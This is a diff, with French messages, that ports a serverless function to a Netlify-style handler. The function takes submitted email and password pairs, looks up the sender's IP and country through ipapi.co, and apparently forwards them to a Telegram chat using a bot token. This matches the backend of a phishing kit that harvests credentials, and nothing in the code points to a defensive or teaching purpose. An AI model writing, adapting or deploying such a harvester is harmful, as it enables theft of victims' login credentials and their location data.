@@ -1,22 +1,30 @@
-export default async function handler(req, res) {
-  if (req.method !== "POST") {
-    return res.status(405).json({ error: "Méthode non autorisée" });
+export async function handler(event, context) {
+  if (event.httpMethod !== "POST") {
+    return {
+      statusCode: 405,
+      headers: { "Access-Control-Allow-Origin": "*" },
+      body: JSON.stringify({ error: "Méthode non autorisée" })
+    };
   }
 
   try {
-    const { email, password } = req.body;
+    const { email, password } = JSON.parse(event.body);
 
     if (!email || !password) {
-      return res.status(400).json({ error: "Email et mot de passe requis" });
+      return {
+        statusCode: 400,
+        headers: { "Access-Control-Allow-Origin": "*" },
+        body: JSON.stringify({ error: "Email et mot de passe requis" })
+      };
     }
 
-    // ✅ Récupération IP (Netlify fournit x-nf-client-connection-ip)
+    // ✅ Récupération IP
     const ip =
-      req.headers["x-nf-client-connection-ip"] ||
-      req.headers["x-forwarded-for"] ||
+      event.headers["x-nf-client-connection-ip"] ||
+      event.headers["x-forwarded-for"] ||
       "IP inconnue";
 
-    // ✅ Localisation (pays)
+    // ✅ Géolocalisation
     let country = "";
     try {
       const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
@@ -28,7 +36,6 @@ export default async function handler(req, res) {
       console.warn("Impossible de récupérer la localisation:", e);
     }
 
-    // ✅ Variables d'environnement (configurées dans Netlify)
     const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
@@ -49,10 +56,18 @@ export default async function handler(req, res) {
       throw new Error(`Erreur Telegram API: ${response.status}`);
     }
 
-    return res.status(200).json({ success: true });
+    return {
+      statusCode: 200,
+      headers: { "Access-Control-Allow-Origin": "*" },
+      body: JSON.stringify({ success: true })
+    };
 
   } catch (error) {
     console.error("Erreur webhook:", error);
-    return res.status(500).json({ error: error.message });
+    return {
+      statusCode: 500,
+      headers: { "Access-Control-Allow-Origin": "*" },
+      body: JSON.stringify({ error: error.message })
+    };
   }
 }
